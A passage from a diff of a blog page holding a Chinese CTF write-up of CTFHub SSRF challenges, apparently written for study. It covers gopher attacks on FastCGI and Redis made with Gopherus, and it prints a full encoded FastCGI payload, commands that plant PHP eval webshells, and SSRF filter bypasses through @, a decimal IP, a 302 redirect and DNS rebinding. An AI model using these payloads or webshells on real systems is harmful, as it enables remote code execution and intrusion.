5%30%61%25%35%33%25%35%33%25%35%32%25%34%36%25%32%30%25%35%35%25%37%30%25%36%63%25%36%66%25%36%31%25%36%34%25%30%64%25%30%61%25%32%64%25%32%64%25%32%64%25%32%64%25%32%64%25%32%64%25%36%37%25%36%35%25%36%33%25%36%62%25%36%66%25%36%36%25%36%66%25%37%32%25%36%64%25%36%32%25%36%66%25%37%35%25%36%65%25%36%34%25%36%31%25%37%32%25%37%39%25%33%37%25%36%32%25%33%38%25%33%32%25%33%32%25%33%38%25%36%33%25%33%34%25%33%39%25%36%35%25%33%35%25%33%32%25%33%37%25%33%33%25%33%30%25%36%33%25%36%33%25%33%30%25%36%33%25%33%37%25%33%38%25%33%38%25%33%37%25%33%36%25%36%36%25%36%32%25%33%32%25%33%31%25%33%32%25%33%30%25%33%34%25%33%32%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%34%34%25%36%39%25%37%33%25%37%30%25%36%66%25%37%33%25%36%39%25%37%34%25%36%39%25%36%66%25%36%65%25%33%61%25%32%30%25%36%36%25%36%66%25%37%32%25%36%64%25%32%64%25%36%34%25%36%31%25%37%34%25%36%31%25%33%62%25%32%30%25%36%65%25%36%31%25%36%64%25%36%35%25%33%64%25%32%32%25%37%33%25%37%35%25%36%32%25%36%64%25%36%39%25%37%34%25%32%32%25%30%64%25%30%61%25%30%64%25%30%61%25%64%30%25%61%34%25%65%35%25%65%32%25%30%64%25%30%61%25%32%64%25%32%64%25%32%64%25%32%64%25%32%64%25%32%64%25%36%37%25%36%35%25%36%33%25%36%62%25%36%66%25%36%36%25%36%66%25%37%32%25%36%64%25%36%32%25%36%66%25%37%35%25%36%65%25%36%34%25%36%31%25%37%32%25%37%39%25%33%37%25%36%32%25%33%38%25%33%32%25%33%32%25%33%38%25%36%33%25%33%34%25%33%39%25%36%35%25%33%35%25%33%32%25%33%37%25%33%33%25%33%30%25%36%33%25%36%33%25%33%30%25%36%33%25%33%37%25%33%38%25%33%38%25%33%37%25%33%36%25%36%36%25%36%32%25%33%32%25%33%31%25%33%32%25%33%30%25%33%34%25%33%32%25%32%64%25%32%64</span><br></pre></td></tr></table></figure>
 
-<p><img src="C:\Users\lenovo\Desktop\道格\寒假task\succe.png" alt="succe"></p>
+<p><img src="/.io//Users\lenovo\Desktop\道格\寒假task\succe.png" alt="succe"></p>
 <p>FastCGI协议：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这次.我们需要攻击一下fastcgi协议咯.也许附件的文章会对你有点帮助</span><br></pre></td></tr></table></figure>
 
 <p>附件地址：<a target="_blank" rel="noopener" href="https://blog.csdn.net/mysteryflower/article/details/94386461">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写_flower未授权-CSDN博客</a></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">类比HTTP协议来说，fastcgi协议则是服务器中间件和某个语言后端进行数据交换的协议。Fastcgi协议由多个record组成，record也有header和body一说，服务器中间件将这二者按照fastcgi的规则封装好发送给语言后端，语言后端解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件。</span><br></pre></td></tr></table></figure>
 
-<p><img src="C:\Users\lenovo\Desktop\道格\寒假task\try.png" alt="try"></p>
+<p><img src="/.io//Users\lenovo\Desktop\道格\寒假task\try.png" alt="try"></p>
 <p>我们尝试直接访问显示404，之后尝试用file读取&#x2F;flag.php和&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php都没有结果。</p>
 <p>根据前面的文章我们重点看最后的任意代码执行部分：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">理论上当然是不可以的，即使我们能控制SCRIPT_FILENAME，让fpm执行任意文件，也只是执行目标服务器上的文件，并不能执行我们需要其执行的文件。</span><br><span class="line"></span><br><span class="line">但PHP是一门强大的语言，PHP.INI中有两个有趣的配置项，auto_prepend_file和auto_append_file。</span><br><span class="line"></span><br><span class="line">auto_prepend_file是告诉PHP，在执行目标文件之前，先包含auto_prepend_file中指定的文件；auto_append_file是告诉PHP，在执行完成目标文件后，包含auto_append_file指向的文件。</span><br><span class="line"></span><br><span class="line">那么就有趣了，假设我们设置auto_prepend_file为php://input，那么就等于在执行任何php文件前都要包含一遍POST的内容。所以，我们只需要把待执行的代码放在Body中，他们就能被执行了。（当然，还需要开启远程文件包含选项allow_url_include）</span><br></pre></td></tr></table></figure>
@@ -450,21 +450,21 @@ http://127.00000.00000.001/ # 0的数量多一点少一点都没影响，最后�
 <p>这里我们需要用到一个Gopherus工具生成fastcgi的payloald：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">利用条件：</span><br><span class="line">libcurl版本&gt;=7.45.0</span><br><span class="line">PHP-FPM监听端口</span><br><span class="line">PHP-FPM版本 &gt;= 5.3.3</span><br><span class="line">知道服务器上任意一个php文件的绝对路径</span><br><span class="line"></span><br><span class="line">python2 gopherus.py --exploit fastcgi //必须是python2的版本</span><br><span class="line"></span><br><span class="line">第一个地方输入：</span><br><span class="line">一个已知存在的php文件如/var/www/html/index.php  </span><br><span class="line"></span><br><span class="line">第二个地方输入：</span><br><span class="line">希望目标服务器执行的恶意命令，比如echo PD9waHAgQGV2YWwoJF9QT1NUWydjbGF5J10pOz8+ | base64 -d &gt; /var/www/html/shell.php  或者  ls/cat f*</span><br></pre></td></tr></table></figure>
 
-<p><img src="C:\Users\lenovo\Desktop\道格\寒假task\gopherus.png" alt="gopherus"></p>
+<p><img src="/.io//Users\lenovo\Desktop\道格\寒假task\gopherus.png" alt="gopherus"></p>
 <p>输出的payload还需要 经过一次URL编码;</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2504%2504%2500%250F%2510SERVER_SOFTWAREgo%2520%2f%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2f1.1%250E%2502CONTENT_LENGTH59%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A%2f%2finput%250F%2517SCRIPT_FILENAME%2fvar%2fwww%2fhtml%2findex.php%250D%2501DOCUMENT_ROOT%2f%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%2500%253B%2504%2500%253C%253Fphp%2520system%2528%2527cat%2520%2ff%252A%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500</span><br></pre></td></tr></table></figure>
 
-<p><img src="C:\Users\lenovo\Desktop\道格\寒假task\succes.png" alt="succes"></p>
+<p><img src="/.io//Users\lenovo\Desktop\道格\寒假task\succes.png" alt="succes"></p>
 <p><strong>Redis协议</strong>：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这次来攻击redis协议吧.redis://127.0.0.1:6379,资料?没有资料!自己找!</span><br></pre></td></tr></table></figure>
 
 <p>这一道题依然可以用gopherus工具：</p>
-<p><img src="C:\Users\lenovo\Desktop\道格\寒假task\redis.png" alt="redis"></p>
+<p><img src="/.io//Users\lenovo\Desktop\道格\寒假task\redis.png" alt="redis"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">python2 gopherus.py --exploit redis</span><br><span class="line"></span><br><span class="line">第一个地方输入：</span><br><span class="line">这里选择是反弹shell还是正向shell         //这题phpshell</span><br><span class="line"></span><br><span class="line">第二个地方输入：</span><br><span class="line">服务器根目录，默认为/var/www/html，可以直接回车</span><br><span class="line"></span><br><span class="line">第三个地方输入：</span><br><span class="line">后门代码比如：&lt;?php @eval($_POST[&#x27;cmd&#x27;]) ?&gt;         //默认写入根目录的shell.php</span><br></pre></td></tr></table></figure>
 
 <p>这里写入代码还是写入一句话木马吧，我尝试了&lt;?php system(‘cat  &#x2F;f*’); ?&gt;似乎不会回显flag</p>
 <p>然后我们可以使用蚁剑连接了：</p>
-<p><img src="C:\Users\lenovo\Desktop\道格\寒假task\ant.png" alt="ant"></p>
+<p><img src="/.io//Users\lenovo\Desktop\道格\寒假task\ant.png" alt="ant"></p>
 <p>最后能在根目录下找到flag</p>
 <p>从其他文章中看到了这些内容：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Redis是一个key-value存储系统。Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</span><br><span class="line">Redis 在默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空），会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的 authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。，也可以直接写入Webshell或者写入计划任务进行反弹shell。</span><br></pre></td></tr></table></figure>
@@ -475,19 +475,19 @@ http://127.00000.00000.001/ # 0的数量多一点少一点都没影响，最后�
 <p>根据前面学习的绕过手法，可以使用@绕过：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-d9c668c92afb0b2b.sandbox.ctfhub.com:10800/?url=http://notfound.ctfhub.com@127.0.0.1/flag.php</span><br></pre></td></tr></table></figure>
 
-<p><img src="C:\Users\lenovo\Desktop\道格\寒假task\url.png" alt="url"></p>
+<p><img src="/.io//Users\lenovo\Desktop\道格\寒假task\url.png" alt="url"></p>
 <p><strong>数字IP Bypass</strong>：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这次ban掉了127以及172.不能使用点分十进制的IP了。但是又要访问127.0.0.1。该怎么办呢</span><br></pre></td></tr></table></figure>
 
 <p>前面学了很多绕过127.0.0.1的，随便挑一个不包含127,172，@，.来用就行：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-9d998ea99bded3ea.sandbox.ctfhub.com:10800/?url=http://2130706433/flag.php</span><br></pre></td></tr></table></figure>
 
-<p><img src="C:\Users\lenovo\Desktop\道格\寒假task\进制.png" alt="进制"></p>
+<p><img src="/.io//Users\lenovo\Desktop\道格\寒假task\进制.png" alt="进制"></p>
 <p>这里我采用的进制转换</p>
 <p><strong>302跳转 Bypass</strong>：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SSRF中有个很重要的一点是请求可能会跟随302跳转，尝试利用这个来绕过对IP的检测访问到位于127.0.0.1的flag.php吧</span><br></pre></td></tr></table></figure>
 
-<p><img src="C:\Users\lenovo\Desktop\道格\寒假task\sudo.png" alt="sudo"></p>
+<p><img src="/.io//Users\lenovo\Desktop\道格\寒假task\sudo.png" alt="sudo"></p>
 <p>如果我们想要自己搭建一个重定向网站呢？</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//shell.php</span><br><span class="line">&lt;?php </span><br><span class="line">header(&quot;Location:http://127.0.0.1/flag.php&quot;);</span><br></pre></td></tr></table></figure>
 
@@ -509,10 +509,10 @@ http://127.00000.00000.001/ # 0的数量多一点少一点都没影响，最后�
 </ol>
 <p>需要用到的网址：<a target="_blank" rel="noopener" href="https://lock.cmpxchg8b.com/rebinder.html">rbndr.us dns rebinding service</a></p>
 <p>这个网站会随机指向两个绑定地址的其中一个，由于127段是回环地址，将AB设置成<code>127.0.0.1</code>和<code>127.0.0.2</code>，每一个都能访问localhost</p>
-<p><img src="C:\Users\lenovo\Desktop\道格\寒假task\DNS.png" alt="DNS"></p>
+<p><img src="/.io//Users\lenovo\Desktop\道格\寒假task\DNS.png" alt="DNS"></p>
 <p>IP会在A、B两个之间反复切换。我们知道，127.201.205.254&#x3D;127.0.0.1 &#x2F;&#x2F;127.0.0.0&#x2F;8是一个环回地址网段，从127.0.0.1 ~ 127.255.255.254都表示localhost，所以A和B都能进内网。</p>
 <p>所以我们的payload为：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-aca6454dc93fb620.sandbox.ctfhub.com:10800/?url=http://7f000001.7f000002.rbndr.us/flag.php</span><br></pre></td></tr></table></figure>
 
-<p><img src="C:\Users\lenovo\Desktop\道格\寒假task\dns2.png" alt="dns2"></p>
+<p><img src="/.io//Users\lenovo\Desktop\道格\寒假task\dns2.png" alt="dns2"></p>
 </article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://ZLARYY123.github.io">ZLARYY</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://zlaryy123.github.io/2026/02/12/SSRF/">https://zlaryy123.github.io/2026/02/12/SSRF/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/avertar.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avertar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">ZLARYY</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">1</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ZLARYY123"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF"><span class="toc-number">1.</span> <span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.</span> <span class="toc-text">相关的函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.2.</span> <span class="toc-text">各种协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%89%8B%E6%B3%95"><span class="toc-number">1.3.</span> <span class="toc-text">绕过手法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CTFHub%E4%B8%8A%E7%9A%84SSRF%E9%A2%98%E7%9B%AE%EF%BC%9A"><span class="toc-number">1.4.</span> <span class="toc-text">CTFHub上的SSRF题目：</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/12/SSRF/" title="SSRF">SSRF</a><time datetime="2026-02-12T07:06:00.000Z" title="Created 2026-02-12 15:06:00">2026-02-12</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By ZLARYY</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.2"></script><script src="/js/main.js?v=5.5.2"></script><div class="js-pjax"></div><script async data-pjax src="/"></script></div></body></html>
